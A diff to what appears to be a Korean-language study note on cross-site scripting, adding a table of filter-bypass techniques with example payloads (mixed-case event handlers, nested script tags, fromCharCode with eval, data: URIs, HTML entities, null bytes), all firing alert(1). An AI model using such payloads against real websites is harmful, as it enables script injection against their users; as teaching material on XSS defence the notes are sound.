@@ -26,6 +26,18 @@
   <img src="x" onerror=alert(1)>    ← 태그 속성 활용
   ```
 
+## 🧨 필터 우회 기법 예시 (Bypass Techniques)
+
+| 기법            | 설명                         | 예시                                                         |
+| ------------- | -------------------------- | ---------------------------------------------------------- |
+| 대소문자 우회       | `onerror` → `oNerror`      | `<img src=x oNerror=alert(1)>`                             |
+| 이중 태그         | 태그 중간 삽입                   | `<scr<script>ipt>alert(1)</script>`                        |
+| 자바스크립트 인코딩    | `String.fromCharCode()` 사용 | `eval(String.fromCharCode(97,108,...))`                    |
+| `data:` URI   | HTML/JS 코드 삽입용             | `location.href='data:text/html,<script>alert(1)</script>'` |
+| HTML Entities | 특수 문자 인코딩                  | `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`            |
+| Null 문자 우회    | 필터 우회에 사용 (일부 서버/브라우저에서)   | `<img src=x%00 onerror=alert(1)>`                          |
+
+
 ---
 
 ### 1. **HTML 인코딩 우회**
